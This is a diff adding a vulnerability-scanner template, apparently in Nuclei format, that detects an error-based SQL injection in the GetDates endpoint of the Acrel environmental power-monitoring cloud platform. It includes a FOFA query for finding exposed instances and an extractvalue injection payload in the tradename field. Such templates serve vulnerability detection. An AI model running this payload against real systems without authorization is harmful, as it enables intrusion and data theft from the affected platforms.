@@ -1,0 +1,49 @@
+id: poc-yaml-acreldny-getdates-sqli
+info:
+  name: 安科瑞环保用电监管云平台 GetDates SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 安科瑞环保用电监管云平台
+    fofa: body="myCss/phone.css"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-landing-page
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "myCss/phone.css"
+      - type: word
+        words:
+          - "/signInIcon/iconfont.css"
+
+  - id: test-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/MainMonitor/GetEnterpriseInfoMapByDate/GetDates"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: "userid=admin&state=1&time=2025-12-29&tradename=1'+and+extractvalue(1,concat(0x7e,{{t2}},0x7e))--+-"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "系统异常"
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: word
+        words:
+          - "{{substr(t2,0,31)}}"
